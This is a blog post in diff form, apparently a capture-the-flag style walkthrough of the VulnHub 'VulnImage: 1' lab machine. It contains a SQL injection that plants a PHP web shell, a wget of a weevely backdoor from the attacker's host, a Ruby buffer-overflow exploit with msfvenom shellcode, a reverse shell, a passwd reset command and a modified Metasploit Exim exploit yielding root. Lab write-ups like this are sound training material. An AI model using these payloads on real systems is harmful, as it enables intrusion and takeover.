@@ -1,0 +1,409 @@
+---
+layout: post
+title: "VulnImage: 1"
+date: 2015-05-10 15:18:05 +0200
+comments: true
+categories: [vulnhub, vulnimage]
+---
+Image: [VulnImage: 1](https://www.vulnhub.com/entry/vulnimage-1,39/)
+
+Nmap output:
+{% codeblock %}
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
+25/tcp   open  smtp        Exim smtpd 4.50
+80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
+7777/tcp open  cbt?
+{% endcodeblock %}
+
+With dirb we found a few interesting directories (repo, admin, profiles),
+directory listing is enabled:
+{% codeblock %}
+---- Scanning URL: http://192.168.80.143/ ----
++ http://192.168.80.143/index (CODE:200|SIZE:71)    
++ http://192.168.80.143/view (CODE:200|SIZE:166)    
+==> DIRECTORY: http://192.168.80.143/admin/    
+==> DIRECTORY: http://192.168.80.143/profiles/    
+==> DIRECTORY: http://192.168.80.143/repo/    
++ http://192.168.80.143/myblog (CODE:200|SIZE:736)    
++ http://192.168.80.143/server-status (CODE:403|SIZE:332)    
+{% endcodeblock %}
+    
+Submitting the quote gives an error SQL message:
+{% codeblock %}
+http://192.168.80.143/admin/profile.php
+Username: '
+Password a
+
+... 
+SELECT * FROM blog_users WHERE poster = ''' AND password = 'a' 
+{% endcodeblock %}
+
+After a few minutes of playing with requests we realize that we can create
+files in format 'username-fname' and with the content of 'sig' parameter.
+{% codeblock %}
+POST /admin/profile.php HTTP/1.1
+Host: 192.168.80.143
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.80.143/admin/profile.php
+Connection: keep-alive
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 104
+
+username=testa&password=test' or '2'='2&sig=<?php system($_REQUEST['cmd']); ?>&fname=x.php&submit=Submit
+{% endcodeblock %}
+
+Now we have a simple PHP shell:
+{% codeblock %}
+http://192.168.80.143/profiles/testa-x.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+{% endcodeblock %}
+
+We download the weevely.php from our server and connect:
+{% codeblock %}
+http://192.168.80.143/profiles/testa-x.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php
+root@kali32:~# weevely http://192.168.80.143/profiles/c.php 1234
+{% endcodeblock %}
+
+In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
+listening on port 7777.
+{% codeblock lang:c %}
+debian:/tmp# cat /var/www/repo/buffd.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <sys/wait.h>
+#include <signal.h>
+
+#define PORT "7777" // the port users will be connecting to
+
+#define BACKLOG 10       // how many pending connections queue will hold
+
+void vulnerable(char *net_buffer)
+{
+char local_buffer[120];
+strcpy(local_buffer, net_buffer);
+return;
+}
+
+void sigchld_handler(int s)
+{
+while(waitpid(-1, NULL, WNOHANG) > 0);
+}
+
+// get sockaddr, IPv4 or IPv6:
+void *get_in_addr(struct sockaddr *sa)
+{
+if (sa->sa_family == AF_INET) {
+return &(((struct sockaddr_in*)sa)->sin_addr);
+}
+
+return &(((struct sockaddr_in6*)sa)->sin6_addr);
+}
+
+int main(void)
+{
+int sockfd, new_fd; // listen on sock_fd, new connection on new_fd
+struct addrinfo hints, *servinfo, *p;
+struct sockaddr_storage their_addr; // connector's address information
+socklen_t sin_size;
+struct sigaction sa;
+int yes=1;
+char in_buffer[20], out_buffer[20], net_buffer[2048];
+char s[INET6_ADDRSTRLEN];
+int rv;
+
+memset(&hints, 0, sizeof hints);
+hints.ai_family = AF_UNSPEC;
+hints.ai_socktype = SOCK_STREAM;
+hints.ai_flags = AI_PASSIVE; // use my IP
+
+if ((rv = getaddrinfo(NULL, PORT, &hints, &servinfo)) != 0) {
+fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
+return 1;
+}
+
+// loop through all the results and bind to the first we can
+for(p = servinfo; p != NULL; p = p->ai_next) {
+if ((sockfd = socket(p->ai_family, p->ai_socktype,
+p->ai_protocol)) == -1) {
+perror("server: socket");
+continue;
+}
+
+if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,
+sizeof(int)) == -1) {
+perror("setsockopt");
+exit(1);
+}
+
+if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
+close(sockfd);
+perror("server: bind");
+continue;
+}
+
+break;
+}
+
+if (p == NULL) {
+fprintf(stderr, "server: failed to bind\n");
+return 2;
+}
+
+freeaddrinfo(servinfo); // all done with this structure
+
+if (listen(sockfd, BACKLOG) == -1) {
+perror("listen");
+exit(1);
+}
+
+sa.sa_handler = sigchld_handler; // reap all dead processes
+sigemptyset(&sa.sa_mask);
+sa.sa_flags = SA_RESTART;
+if (sigaction(SIGCHLD, &sa, NULL) == -1) {
+perror("sigaction");
+exit(1);
+}
+
+printf("server: waiting for connections...\n");
+
+while(1) { // main accept() loop
+sin_size = sizeof their_addr;
+new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
+if (new_fd == -1) {
+perror("accept");
+continue;
+}
+
+inet_ntop(their_addr.ss_family,
+get_in_addr((struct sockaddr *)&their_addr),
+s, sizeof s);
+printf("server: got connection from %s\n", s);
+
+if (!fork()) { // this is the child process
+close(sockfd); // child doesn't need the listener
+memset(net_buffer, 0, 1024);
+strcpy(out_buffer, "HELO\nCOMMAND:");
+if (send(new_fd, out_buffer, strlen(out_buffer), 0) == -1)
+perror("send");
+if (recv(new_fd, net_buffer, 1024, 0))
+{
+vulnerable(net_buffer);
+strcpy(out_buffer, "RECV: ");
+strcat(out_buffer, net_buffer);
+send(new_fd, out_buffer, strlen(out_buffer), 0);
+}
+close(new_fd);
+exit(0);
+}
+close(new_fd); // parent doesn't need this
+}
+
+return 0;
+}
+{% endcodeblock %}
+
+We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
+patterns we calculate the offset for EIP. To make an exploit reliable, we are
+looking also for some registers, pointing to our pattern in memory.
+{% codeblock %}
+root@kali32:~/repo# gdb ./buffd  -q
+Reading symbols from /root/repo/buffd...done.
+(gdb) set follow-fork-mode child
+(gdb) run
+Starting program: /root/repo/buffd
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
+server: waiting for connections...
+server: got connection from 127.0.0.1
+[New process 4201]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 4201]
+0x65413165 in ?? ()
+(gdb) i r
+eax            0xbfffe790       -1073748080
+ecx            0x0      0
+edx            0xca     202
+ebx            0xb7fbeff4       -1208225804
+esp            0xbfffe810       0xbfffe810
+ebp            0x41306541       0x41306541
+esi            0x0      0
+edi            0x0      0
+eip            0x65413165       0x65413165
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x /5x $eax
+0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
+0xbfffe7a0:     0x61413561
+
+root@kali32:~# nc 127.0.0.1 7777
+HELO
+COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+^C
+root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
+[*] Exact match at offset 124
+root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
+[*] Exact match at offset 0
+{% endcodeblock %}
+
+EIP begins on offset 124 and the register EAX points to the beginning of our
+buffer, right now filled with pattern. Luckily, we find jmp eax opcodes in
+binary too.
+
+The strange thing is that the stack in binary is marked as not executable, 
+but on this server the exploit works and we don't get segfault:
+{% codeblock %}
+www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
+Elf file type is EXEC (Executable file)
+Entry point 0x80488e0
+There are 7 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
+  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
+  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
+  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+{% endcodeblock %}
+
+Exploit in Ruby:
+{% codeblock lang:ruby %}
+root@kali32:~# cat exploit.rb
+#!/usr/bin/env ruby
+
+require 'socket'
+
+#root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd
+#[repo/buffd]
+#0x0804898f call eax
+#0x08048efb call eax
+
+#root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec -b '\x00\xff' CMD="/tmp/commands" -f ruby
+buf =
+"\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9" +
+"\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6" +
+"\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91" +
+"\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b" +
+"\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0" +
+"\xb8\x8e\x24\x01\x8b\xb1"
+
+exploit = buf + "A" * (124 - buf.length)
+exploit << [0x0804898f].pack("V")
+
+host = ARGV[0]
+host ||= "192.168.80.143"
+
+puts "Using host: #{host}"
+
+s = TCPSocket.new host, 7777
+s.puts(exploit)
+s.close
+{% endcodeblock %}
+
+Exploits runs arbitrary command, that we put on vulnerable server to /tmp/commands. 
+
+We connect to the host:
+{% codeblock %}
+www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect
+
+root@kali32:~# nc -lvp 1337
+listening on [any] 1337 ...
+192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
+sh: no job control in this shell
+sh-2.05b$ cd /tmp
+{% endcodeblock %}
+
+To obtain root privileges, we can run ssh server and put to 'commands' the command to change root password:
+{% codeblock %}
+debian:/tmp# chmod +x commands
+debian:/tmp# cat commands
+echo -e "1234\n1234\n" | passwd
+{% endcodeblock %}
+
+Kernel is vulnerable too, using this exploit we can get uid 0 privileges:
+{% codeblock %}
+sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479
+{% endcodeblock %}
+
+In Metasploit is there is another module which we can use to exploit Exim4
+(exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
+to comment the following lines and also change exim to exim4:
+{% codeblock lang:ruby %}
+114     #if not datastore['SkipVersionCheck'] and self.banner !~ /Exim 4\.6\d+/i
+115     #  fail_with(Failure::Unknown, "Warning: This version of Exim is not exploitable")
+116     #end
+...
+341       sock.put("PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim4 -C#{temp_conf} -q\n")
+{% endcodeblock %}
+
+{% codeblock %}
+msf exploit(exim4_string_format) > rexploit
+[*] Reloading module...
+
+[*] Started reverse double handler
+[*] Connecting to 192.168.80.143:25 ...
+[*] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
+[*] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
+[*] EHLO: 250-SIZE 52428800
+[*] EHLO: 250-PIPELINING
+[*] EHLO: 250 HELP
+[*] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
+[*] MAIL: 250 OK
+[*] RCPT: 250 Accepted
+[*] DATA: 354 Enter message, ending with "." on a line by itself
+[*] Constructing initial headers ...
+[*] Constructing HeaderX ...
+[*] Constructing body ...
+[*] Sending 50 megabytes of data...
+[*] Ending first message.
+[*] Result: "552 Message size exceeds maximum permitted\r\n"
+[*] Sending second message ...
+[*] MAIL result: "250 OK\r\n"
+[*] RCPT result: "sh-2.05b$ "
+[*] Looking for Perl to facilitate escalation...
+[*] Perl binary detected, attempt to escalate...
+[*] Using Perl interpreter at /usr/bin/perl...
+[*] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv...
+[*] Attempting to execute payload as root...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo QDibz6UzrEBUyJQT;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "QDibz6UzrEBUyJQT\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200
+
+id
+uid=0(root) gid=0(root)
+{% endcodeblock %}
